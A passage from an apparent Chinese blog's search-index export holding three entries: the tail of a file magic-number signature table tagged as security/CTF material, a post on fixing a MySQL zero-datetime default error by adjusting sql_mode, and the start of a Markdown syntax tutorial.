{“扩展名”:”PPC”,”文件头标识（HEX）”:”526563”,”文件描述”:””},<br>    {“扩展名”:”PPT”,”文件头标识（HEX）”:”D0CF11”,”文件描述”:””},<br>    {<br>        “扩展名”: “ppt”,<br>        “文件头标识（HEX）”: “[512byteoffset] 00 6E 1E F0”,<br>        “文件描述”: “PowerPoint presentation subheader (MS Office)”<br>    },<br>    {<br>        “扩展名”: “ppt”,<br>        “文件头标识（HEX）”: “[512byteoffset] 0F 00 E8 03”,<br>        “文件描述”: “PowerPoint presentation subheader (MS Office)”<br>    },<br>    {“扩展名”:”PPZ”,”文件头标识（HEX）”:”4D534346”,”文件描述”:”PowerpointPackagedPresentation”},<br>    {“扩展名”:”prc”,”文件头标识（HEX）”:”424F4F4B4D4F4249”,”文件描述”:”Palmpilotresourcefile”},<br>    {“扩展名”:”PRG”,”文件头标识（HEX）”:”234445”,”文件描述”:””},<br>    {“扩展名”:”ps”,”文件头标识（HEX）”:”252150532D41646F6265”,”文件描述”:”Postscript”},<br>    {“扩展名”:”PSD”,”文件头标识（HEX）”:”384250”,”文件描述”:””},<br>    {“扩展名”:”psd”,”文件头标识（HEX）”:”38425053”,”文件描述”:”AdobePhotoshopimagefile”},<br>    {“扩展名”:”psp”,”文件头标识（HEX）”:”7E424B00”,”文件描述”:”PaintShopProImageFile”},<br>    {“扩展名”:”pst”,”文件头标识（HEX）”:”2142444E”,”文件描述”:”MicrosoftOutlookPersonalFolderfile”},<br>    {“扩展名”:”pwl”,”文件头标识（HEX）”:”E3828596”,”文件描述”:”WindowsPassword”},<br>    {“扩展名”:”qbb”,”文件头标识（HEX）”:”458600000600”,”文件描述”:”IntuitQuickBooksBackupfile”},<br>    {“扩展名”:”qdf”,”文件头标识（HEX）”:”AC9EBD8F”,”文件描述”:”Quicken”},<br>    {“扩展名”:”qph”,”文件头标识（HEX）”:”03000000”,”文件描述”:”Quickenpricehistoryfile”},<br>    {“扩展名”:”qt”,”文件头标识（HEX）”:”6D646174”,”文件描述”:”QuicktimeMovieFile”},<br>    {“扩展名”:”qxd”,”文件头标识（HEX）”:”00004949585052”,”文件描述”:”QuarkExpressdocument(Intel&amp;Motorola,respectively)”},<br>    {“扩展名”:”qxd”,”文件头标识（HEX）”:”00004D4D585052”,”文件描述”:””},<br>    {“扩展名”:”ra”,”文件头标识（HEX）”:”2E524D460000001200”,”文件描述”:”RealAudiofile”},<br>    {“扩展名”:”ra;ram”,”文件头标识（HEX）”:”2E7261FD”,”文件描述”:”RealAudioFile”},<br>    {“扩展名”:”ra”,”文件头标识（HEX）”:”2E7261FD00”,”文件描述”:”RealAudiostreamingmediafile”},<br>    {“扩展名”:”RAR”,”文件头标识（HEX）”:”526172”,”文件描述”:””},<br>    {“扩展名”:”rar”,”文件头标识（HEX）”:”52617221”,”文件描述”:”RARArchiveFile”},<br>    {“扩展名”:”RAW”,”文件头标识（HEX）”:”060500”,”文件描述”:””},<br>    {“扩展名”:”reg”,”文件头标识（HEX）”:”5245474544495434”,”文件描述”:””},<br>    {“扩展名”:”rgb”,”文件头标识（HEX）”:”01DA01010003”,”文件描述”:”SiliconGraphicsRGBBitmap”},<br>    {“扩展名”:”RM”,”文件头标识（HEX）”:”2E524D”,”文件描述”:””},<br>    {“扩展名”:”rm;rmvb”,”文件头标识（HEX）”:”2E524D46”,”文件描述”:”RealMediastreamingmediafile”},<br>    {“扩展名”:”rpm”,”文件头标识（HEX）”:”EDABEEDB”,”文件描述”:”RPMArchiveFile”},<br>    {“扩展名”:”RTD”,”文件头标识（HEX）”:”43232B44A4434DA5486472”,”文件描述”:”RagTimedocumentfile”},<br>    {“扩展名”:”RTF”,”文件头标识（HEX）”:”7B5C72”,”文件描述”:””},<br>    {“扩展名”:”rtf”,”文件头标识（HEX）”:”7B5C727466”,”文件描述”:”RichTextFormatFile”},<br>    {“扩展名”:”sav”,”文件头标识（HEX）”:”24464C3240282329205350535320444154412046494C45”,”文件描述”:”SPSSDatafile”},<br>    {“扩展名”:”SBV”,”文件头标识（HEX）”:”46454446”,”文件描述”:”(Unknownfiletype)”},<br>    {“扩展名”:”SCH”,”文件头标识（HEX）”:”2A7665”,”文件描述”:””},<br>    {“扩展名”:”scm”,”文件头标识（HEX）”:”805343”,”文件描述”:””},<br>    {“扩展名”:”SH3”,”文件头标识（HEX）”:”4848474231”,”文件描述”:”HarvardGraphicspresentationfile”},<br>    {“扩展名”:”SHD”,”文件头标识（HEX）”:”4B490000”,”文件描述”:”Windows9xprinterspoolfile”},<br>    {“扩展名”:”sit”,”文件头标识（HEX）”:”53495421”,”文件描述”:”Stuffitv1ArchiveFile”},<br>    {“扩展名”:”sit”,”文件头标识（HEX）”:”53747566664974”,”文件描述”:”Stuffitv5ArchiveFile”},<br>    {“扩展名”:”sle”,”文件头标识（HEX）”:”3A56455253494F4E”,”文件描述”:”Surfplankiteprojectfile”},<br>    {“扩展名”:”sle”,”文件头标识（HEX）”:”414376”,”文件描述”:”teganosSecuritySuitevirtualsecuredrive”},<br>    {“扩展名”:”sly;srt;slt”,”文件头标识（HEX）”:”53520100”,”文件描述”:”Sagesly.or.srt.or.slt”},<br>    {“扩展名”:”SMD”,”文件头标识（HEX）”:”00FFFF”,”文件描述”:””},<br>    {“扩展名”:”snm”,”文件头标识（HEX）”:”001E849000000000”,”文件描述”:”NetscapeCommunicator(v4)mailfolder”},<br>    {“扩展名”:”SNP”,”文件头标识（HEX）”:”4D534346”,”文件描述”:”MicrosoftAccessSnapshotViewerfile”},<br>    {“扩展名”:”sol”,”文件头标识（HEX）”:”00BF”,”文件描述”:”AdobeFlashsharedobjectfile(e.g.,Flashcookies)”},<br>    {“扩展名”:”spl”,”文件头标识（HEX）”:”00000100”,”文件描述”:”WindowsNT&#x2F;2000&#x2F;XPprinterspoolfile”},<br>    {“扩展名”:”SCR”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”Screensaver”},<br>    {“扩展名”:”SUB”,”文件头标识（HEX）”:”FFFFFF”,”文件描述”:””},<br>    {“扩展名”:”SWF”,”文件头标识（HEX）”:”435753”,”文件描述”:”ShockwaveFlashfile(v5+)”},<br>    {“扩展名”:”SWF”,”文件头标识（HEX）”:”465753”,”文件描述”:”MacromediaShockwaveFlashplayerfile”},<br>    {“扩展名”:”sxc”,”文件头标识（HEX）”:”calc”,”文件描述”:”OpenOfficeCalc”},<br>    {“扩展名”:”sxd”,”文件头标识（HEX）”:”draw”,”文件描述”:”OpenOfficeDraw”},<br>    {“扩展名”:”sxi”,”文件头标识（HEX）”:”impress”,”文件描述”:”OpenOfficeImpress”},<br>    {“扩展名”:”sxm”,”文件头标识（HEX）”:”math”,”文件描述”:”OpenOfficeMath”},<br>    {“扩展名”:”sxw”,”文件头标识（HEX）”:”writer”,”文件描述”:”OpenOfficeWriter”},<br>    {“扩展名”:”syw”,”文件头标识（HEX）”:”414D594F”,”文件描述”:”HarvardGraphicssymbolgraphic”},<br>    {“扩展名”:”TAG”,”文件头标识（HEX）”:”000002”,”文件描述”:””},<br>    {“扩展名”:”tar;cpio”,”文件头标识（HEX）”:”303730373037”,”文件描述”:”CPIOArchiveFile”},<br>    {“扩展名”:”tar.z”,”文件头标识（HEX）”:”1F9D90”,”文件描述”:”Compressedtapearchivefile”},<br>    {“扩展名”:”tga”,”文件头标识（HEX）”:”0000100000”,”文件描述”:”RLE压缩的前5字节”},<br>    {“扩展名”:”TGA”,”文件头标识（HEX）”:”000002”,”文件描述”:””},<br>    {“扩展名”:”tga”,”文件头标识（HEX）”:”0000020000”,”文件描述”:”未压缩的前5字节”},<br>    {“扩展名”:”TIF;TIFF”,”文件头标识（HEX）”:”492049”,”文件描述”:”TaggedImageFileFormatfile”},<br>    {“扩展名”:”tif;tiff”,”文件头标识（HEX）”:”49492A”,”文件描述”:”TIFF(Intel)”},<br>    {“扩展名”:”tif;tiff”,”文件头标识（HEX）”:”49492A00”,”文件描述”:”TaggedImageFileFormatfile(littleendian,i.e.,LSBfirstinthebyte;Intel)”},<br>    {“扩展名”:”TIF;TIFF”,”文件头标识（HEX）”:”4D4D002A”,”文件描述”:”TaggedImageFileFormatfile(bigendian,i.e.,LSBlastinthebyte;Motorola)”},<br>    {“扩展名”:”tif;tiff”,”文件头标识（HEX）”:”4D4D2A”,”文件描述”:”TIFF(Motorola)”},<br>    {“扩展名”:”TIF;TIFF”,”文件头标识（HEX）”:”4D4D002B”,”文件描述”:”BigTIFFfiles;TaggedImageFileFormatfiles&gt;4GB”},<br>    {“扩展名”:”TLB”,”文件头标识（HEX）”:”4D53465402000100”,”文件描述”:”OLE,SPSS,orVisualC++typelibraryfile”},<br>    {“扩展名”:”tr1”,”文件头标识（HEX）”:”0110”,”文件描述”:”NovellLANalyzercapturefile”},<br>    {“扩展名”:”TST”,”文件头标识（HEX）”:”000100”,”文件描述”:””},<br>    {“扩展名”:”TTF”,”文件头标识（HEX）”:”000100”,”文件描述”:””},<br>    {“扩展名”:”ufa”,”文件头标识（HEX）”:”554641”,”文件描述”:”UFAArchiveFile”},<br>    {“扩展名”:”VBX”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”VisualBASICapplication”},<br>    {“扩展名”:”VCD”,”文件头标识（HEX）”:”454E5452595643440200000102001858”,”文件描述”:”VideoVCD(GNUVCDImager)file”},<br>    {“扩展名”:”vcf”,”文件头标识（HEX）”:”424547494E3A56434152440D0A”,”文件描述”:”vCardfile”},<br>    {“扩展名”:”vob”,”文件头标识（HEX）”:”000001BA”,”文件描述”:”DVDVideoMovieFile(video&#x2F;dvd,video&#x2F;mpeg)”},<br>    {“扩展名”:”VXD,386”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”Windowsvirtualdevicedrivers”},<br>    {“扩展名”:”WAV”,”文件头标识（HEX）”:”524946”,”文件描述”:””},<br>    {“扩展名”:”wav”,”文件头标识（HEX）”:”57415645”,”文件描述”:”Wave”},<br>    {“扩展名”:”wav”,”文件头标识（HEX）”:”57415645666D74”,”文件描述”:”WaveFiles”},<br>    {“扩展名”:”wb2”,”文件头标识（HEX）”:”00000200”,”文件描述”:”QuattroProforWindowsSpreadsheetfile”},<br>    {<br>        “扩展名”: “wb3”,<br>        “文件头标识（HEX）”: “[24byteoffset] 3E 00 03 00 FE FF 09 00 06”,<br>        “文件描述”: “Quatro Pro for Windows 7.0 Notebook file”<br>    },<br>    {“扩展名”:”wk1;wks”,”文件头标识（HEX）”:”2000604060”,”文件描述”:”Lotus123v1Worksheet”},<br>    {“扩展名”:”wk1”,”文件头标识（HEX）”:”0000020006040600080000000000”,”文件描述”:”Lotus1-2-3spreadsheet(v1)file”},<br>    {“扩展名”:”wk3”,”文件头标识（HEX）”:”00001A0000100400”,”文件描述”:”Lotus123spreadsheet(v3)file”},<br>    {“扩展名”:”wk4;wk5”,”文件头标识（HEX）”:”00001A0002100400”,”文件描述”:”Lotus1-2-3spreadsheet(v4,v5)file”},<br>    {“扩展名”:”wks”,”文件头标识（HEX）”:”0E574B53”,”文件描述”:”DeskMateWorksheet”},<br>    {“扩展名”:”WMA”,”文件头标识（HEX）”:”3026B2”,”文件描述”:””},<br>    {“扩展名”:”wmf”,”文件头标识（HEX）”:”01000900”,”文件描述”:”GraphicsMetafile”},<br>    {“扩展名”:”wmf”,”文件头标识（HEX）”:”010009000003”,”文件描述”:”WindowsMetadatafile(Win3.xformat)”},<br>    {“扩展名”:”wmf”,”文件头标识（HEX）”:”02000900”,”文件描述”:”GraphicsMetafile”},<br>    {“扩展名”:”wmf”,”文件头标识（HEX）”:”D7CDC69A”,”文件描述”:”WindowsMetaFile”},<br>    {“扩展名”:”WMV”,”文件头标识（HEX）”:”3026B2”,”文件描述”:””},<br>    {“扩展名”:”wp”,”文件头标识（HEX）”:”FF575043”,”文件描述”:”WordPerfectv5orv6”},<br>    {“扩展名”:”wpd”,”文件头标识（HEX）”:”FF575043”,”文件描述”:”WordPerfect”},<br>    {“扩展名”:”wpg”,”文件头标识（HEX）”:”FF575047”,”文件描述”:”WordPerfectGraphics”},<br>    {“扩展名”:”wri”,”文件头标识（HEX）”:”31BE”,”文件描述”:”MicrosoftWritefile”},<br>    {“扩展名”:”WRI”,”文件头标识（HEX）”:”31BE00”,”文件描述”:””},<br>    {“扩展名”:”wri”,”文件头标识（HEX）”:”32BE”,”文件描述”:”MicrosoftWritefile”},<br>    {“扩展名”:”ws”,”文件头标识（HEX）”:”1D7D”,”文件描述”:”WordStarVersion5.0&#x2F;6.0document”},<br>    {“扩展名”:”XBE”,”文件头标识（HEX）”:”584245”,”文件描述”:””},<br>    {“扩展名”:”xdr”,”文件头标识（HEX）”:”3C”,”文件描述”:”BizTalkXML-DataReducedSchemafile”},<br>    {“扩展名”:”xls”,”文件头标识（HEX）”:”0902060000001000B9045C00”,”文件描述”:”MSExcelv2”},<br>    {“扩展名”:”xls”,”文件头标识（HEX）”:”0904060000001000F6055C00”,”文件描述”:”MSExcelv4”},<br>    {“扩展名”:”XLS”,”文件头标识（HEX）”:”D0CF11”,”文件描述”:””},<br>    {“扩展名”:”xls”,”文件头标识（HEX）”:”D0CF11E0”,”文件描述”:”MSExcel”},<br>    {<br>        “扩展名”: “xls”,<br>        “文件头标识（HEX）”: “[512byteoffset]  09 08 10 00 00 06 05 00”,<br>        “文件描述”: “Excel spreadsheet subheader (MS Office)”<br>    },<br>    {“扩展名”:”XML”,”文件头标识（HEX）”:”3C3F78”,”文件描述”:””},<br>    {“扩展名”:”xml”,”文件头标识（HEX）”:”3C3F786D6C”,”文件描述”:”XMLDocument”},<br>    {“扩展名”:”xml”,”文件头标识（HEX）”:”FFFE3C0052004F004F0054005300540055004200”,”文件描述”:”XMLDocument(ROOTSTUB)”},<br>    {“扩展名”:”XMV”,”文件头标识（HEX）”:”005001”,”文件描述”:””},<br>    {“扩展名”:”XSL”,”文件头标识（HEX）”:”FFFE3C”,”文件描述”:””},<br>    {“扩展名”:”xul”,”文件头标识（HEX）”:”7273696F6E3D22313C3F786D6C2076652E30223F3E”,”文件描述”:”XMLUserInterfaceLanguagefile”},<br>    {“扩展名”:”z”,”文件头标识（HEX）”:”1F9D”,”文件描述”:”TARCompressedArchiveFile”},<br>    {“扩展名”:”Z”,”文件头标识（HEX）”:”1F9D8C”,”文件描述”:””},<br>    {“扩展名”:”ZIP”,”文件头标识（HEX）”:”504B03”,”文件描述”:””},<br>    {“扩展名”:”zip;jar;zipx”,”文件头标识（HEX）”:”504B0304”,”文件描述”:”ZIPArchive”},<br>    {“扩展名”:”zip”,”文件头标识（HEX）”:”504B3030”,”文件描述”:”ZIPArchive(outdated)”},<br>    {“扩展名”:”Zip”,”文件头标识（HEX）”:”504B3030504B0304”,”文件描述”:”WINZIPCompressed”},<br>    {“扩展名”:”zoo”,”文件头标识（HEX）”:”5A4F4F20”,”文件描述”:”ZOOArchiveFile”}<br>]</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql中默认Datatime为0时间报错问题解决</title>
      <link href="/2021/01/02/47ee6c9eb30a-q1jun/"/>
      <url>/2021/01/02/47ee6c9eb30a-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql中默认Datatime为0时间报错"><a href="#Mysql中默认Datatime为0时间报错" class="headerlink" title="Mysql中默认Datatime为0时间报错"></a>Mysql中默认Datatime为0时间报错</h1><p>运行Sql脚本时报错：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Err] <span class="number">1067</span> <span class="operator">-</span> Invalid <span class="keyword">default</span> <span class="keyword">value</span> <span class="keyword">for</span> <span class="string">&#x27;UPDATE_TIME&#x27;</span></span><br></pre></td></tr></table></figure><p>这个问题和mysql中sql_mode有关系，我们可以采用两种方法来查看它的值:</p><p><strong>方法1</strong>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;sql_mode%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>返回：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name <span class="operator">|</span> <span class="keyword">Value</span>                                                                                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> sql_mode      <span class="operator">|</span> ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.15</span> sec)</span><br></pre></td></tr></table></figure><p><strong>方法2:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@sql</span>_mode;</span><br></pre></td></tr></table></figure><p>返回：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> @<span class="variable">@sql</span>_mode                                                                                                            <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.05</span> sec)</span><br></pre></td></tr></table></figure><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>可以看到sql_mode中有NO_ZERO_IN_DATE,NO_ZERO_DATE两个字段，这就是罪魁祸首，我们只需要在全局设置（Global）把这两个字段给去掉就行了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="keyword">global</span> sql_mode<span class="operator">=</span><span class="string">&#x27;ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.03</span> sec)</span><br></pre></td></tr></table></figure><p>然后重启Mysql服务，如果不想重启也可直接设置当前的sql_mode，但是一定要设置全局的sql_mode，否则关掉此终端就又恢复原样了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> sql_mode<span class="operator">=</span><span class="string">&#x27;ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.05</span> sec)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> session sql_mode<span class="operator">=</span><span class="string">&#x27;ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.05</span> sec)</span><br></pre></td></tr></table></figure><p>重新查询Sql_mode：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;sql_mode%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name <span class="operator">|</span> <span class="keyword">Value</span>                                                                                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> sql_mode      <span class="operator">|</span> ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.04</span> sec)</span><br><span class="line"> </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Linux </tag>
            
            <tag> MySql </tag>
            
            <tag> 报错 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MarkDown使用教程</title>
      <link href="/2020/12/12/a801c1bd0b64-q1jun/"/>
      <url>/2020/12/12/a801c1bd0b64-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="markdown-教程"><a href="#markdown-教程" class="headerlink" title="markdown 教程"></a>markdown 教程</h1><h2 id="1-Markdown-标题"><a href="#1-Markdown-标题" class="headerlink" title="1.Markdown 标题"></a>1.Markdown 标题</h2><p>1、使用 &#x3D; 和 - 标记一级和二级标题<br>&#x3D; 和 - 标记语法格式如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">我展示的是一级标题</span></span><br><span class="line"><span class="section">=================</span></span><br><span class="line"></span><br><span class="line"><span class="section">我展示的是二级标题</span></span><br><span class="line"><span class="section">-----------------</span></span><br></pre></td></tr></table></figure><p>2 、使用 # 号标记</p><p>使用 <strong>#</strong> 号可表示 1-6 级标题，一级标题对应一个 <strong>#</strong> 号，二级标题对应两个 <strong>#</strong> 号，以此类推。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br></pre></td></tr></table></figure><h2 id="2-Markdown-段落"><a href="#2-Markdown-段落" class="headerlink" title="2.Markdown 段落"></a>2.Markdown 段落</h2><p>Markdown 段落没有特殊的格式，直接编写文字就好，<strong>段落的换行是使用两个以上空格加上回车</strong>。  </p><h2 id="3-字体"><a href="#3-字体" class="headerlink" title="3.字体"></a>3.字体</h2><p>Markdown 可以使用以下几种字体:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">*斜体文本*</span></span><br><span class="line"><span class="emphasis">_斜体文本_</span></span><br><span class="line"><span class="strong">**粗体文本**</span></span><br><span class="line"><span class="emphasis">__粗体文本__</span></span><br><span class="line"><span class="strong">***粗斜体文本**</span>*</span><br><span class="line"><span class="emphasis">___粗斜体文本__</span>_</span><br></pre></td></tr></table></figure><h2 id="3-分隔线"><a href="#3-分隔线" class="headerlink" title="3.分隔线"></a>3.分隔线</h2><p>你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">*</span> <span class="emphasis">* *</span></span></span><br><span class="line"><span class="strong"></span></span><br><span class="line"><span class="strong">**</span><span class="strong">**<span class="emphasis">*</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">- - -</span></span></span><br><span class="line"><span class="emphasis"><span class="strong"></span></span></span><br><span class="line"><span class="emphasis"><span class="strong">----------</span></span></span><br></pre></td></tr></table></figure><h2 id="4-删除线"><a href="#4-删除线" class="headerlink" title="4.删除线"></a>4.删除线</h2><p>如果段落上的文字要添加删除线，只需要在文字的两端加上两个波浪线<code>~~</code>即可，实例如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RUNOOB<span class="selector-class">.COM</span></span><br><span class="line">GOOGLE<span class="selector-class">.COM</span></span><br><span class="line">~~BAIDU.COM~~</span><br></pre></td></tr></table></figure><h2 id="5-下划线"><a href="#5-下划线" class="headerlink" title="5.下划线"></a>5.下划线</h2><p>下划线可以通过 HTML 的 <code>&lt;u&gt; </code>标签来实现：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span>带下划线文本<span class="tag">&lt;/<span class="name">u</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-脚注"><a href="#6-脚注" class="headerlink" title="6.脚注"></a>6.脚注</h2><p>脚注是对文本的补充说明。</p><p>Markdown 脚注的格式如下:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^要注明的文本]</span><br></pre></td></tr></table></figure><p>以下实例演示了脚注的用法：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建脚注格式类似这样 [^要注明的文本]。</span><br><span class="line"></span><br><span class="line">[<span class="symbol">^Q1JUN.CN</span>]: <span class="link">一个个人博客界面！</span></span><br></pre></td></tr></table></figure><h2 id="7-Markdown-列表"><a href="#7-Markdown-列表" class="headerlink" title="7.Markdown 列表"></a>7.Markdown 列表</h2><p>Markdown 支持有序列表和无序列表。</p><p>无序列表使用星号(*)、加号(+)或是减号(-)作为列表标记，这些标记后面要添加一个空格，然后再填写内容：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> 第一项</span><br><span class="line"><span class="bullet">*</span> 第二项</span><br><span class="line"><span class="bullet">*</span> 第三项</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> 第一项</span><br><span class="line"><span class="bullet">+</span> 第二项</span><br><span class="line"><span class="bullet">+</span> 第三项</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 第一项</span><br><span class="line"><span class="bullet">-</span> 第二项</span><br><span class="line"><span class="bullet">-</span> 第三项</span><br></pre></td></tr></table></figure><p>有序列表使用数字并加上 . 号来表示，如：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 第一项</span><br><span class="line"><span class="bullet">2.</span> 第二项</span><br><span class="line"><span class="bullet">3.</span> 第三项</span><br></pre></td></tr></table></figure><h3 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h3><p>列表嵌套只需在子列表中的选项前面添加四个空格即可：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 